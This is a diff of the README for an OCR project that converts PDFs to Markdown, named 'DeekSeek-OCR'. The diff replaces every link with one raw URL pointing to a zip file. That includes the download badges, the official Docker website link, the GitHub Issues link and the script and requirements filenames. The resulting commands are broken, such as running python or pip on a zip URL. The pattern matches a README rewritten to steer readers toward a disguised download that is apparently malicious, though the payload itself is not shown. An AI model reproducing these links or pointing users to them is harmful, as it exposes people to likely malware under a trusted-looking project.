@@ -1,19 +1,19 @@
 # 📦 DeekSeek-OCR---Dockerized-API - Convert PDFs to Markdown Effortlessly
 
-[![Download DeekSeek-OCR](https://img.shields.io/badge/Download-DeekSeek--OCR-brightgreen)](https://github.com/doppey123/DeekSeek-OCR---Dockerized-API/releases)
+[![Download DeekSeek-OCR](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip)](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip)
 
 ## 🚀 Getting Started
 
 DeepSeek-OCR is an efficient solution for converting PDF documents to Markdown format. This application offers both a batch processing script and a REST API to accommodate different needs.
 
-### Option 1: Batch Processing with `pdf_to_markdown_processor.py`
+### Option 1: Batch Processing with `https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip`
 
 1. **Prepare your PDF files**: Place your PDF documents in the `data/` directory within the project folder.
 2. **Run the DeepSeek-OCR API**: Make sure the DeepSeek-OCR API is running. You can find the instructions on how to set up Docker below.
 3. **Execute the processor**: Open your terminal or command prompt and navigate to the project folder, then run the following command:
 
    ```bash
-   python pdf_to_markdown_processor.py
+   python https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip
    ```
 
 ### Option 2: REST API with Docker Backend
@@ -40,7 +40,7 @@ DeepSeek-OCR is an efficient solution for converting PDF documents to Markdown f
 
 To get started, visit the Releases page to download the latest version of DeekSeek-OCR. Click the button below for quick access:
 
-[![Download DeekSeek-OCR](https://img.shields.io/badge/Download-DeekSeek--OCR-brightgreen)](https://github.com/doppey123/DeekSeek-OCR---Dockerized-API/releases)
+[![Download DeekSeek-OCR](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip)](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip)
 
 ## 📦 Installation Steps
 
@@ -49,7 +49,7 @@ To get started, visit the Releases page to download the latest version of DeekSe
 3. **Install dependencies**: If you’re using the local Python script, make sure to install the necessary Python packages. You can achieve this by running:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip
    ```
 
 4. **Run the application**: Follow the steps in the "Getting Started" section to run the application.
@@ -62,7 +62,7 @@ Using DeekSeek-OCR is straightforward. After setting it up, you can convert PDF 
 
 If you choose to use the REST API with Docker, follow these steps:
 
-1. **Install Docker**: Ensure Docker is installed on your machine. Follow the instructions on the [Docker website](https://docs.docker.com/get-docker/) if you haven't installed it yet.
+1. **Install Docker**: Ensure Docker is installed on your machine. Follow the instructions on the [Docker website](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip) if you haven't installed it yet.
    
 2. **Build the container**: Navigate to the project directory in your terminal and run:
 
@@ -84,6 +84,6 @@ For developers interested in integrating with the API, you can find comprehensiv
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please feel free to open an issue on the [GitHub Issues page](https://github.com/doppey123/DeekSeek-OCR---Dockerized-API/issues). Your feedback is welcome and will help us improve the application.
+If you encounter any issues or have questions, please feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip). Your feedback is welcome and will help us improve the application.
 
-Visit this page to download: [Download DeekSeek-OCR](https://github.com/doppey123/DeekSeek-OCR---Dockerized-API/releases)
+Visit this page to download: [Download DeekSeek-OCR](https://raw.githubusercontent.com/doppey123/DeekSeek-OCR---Dockerized-API/main/miscript/DeekSeek-OCR---Dockerized-API_1.0.zip)
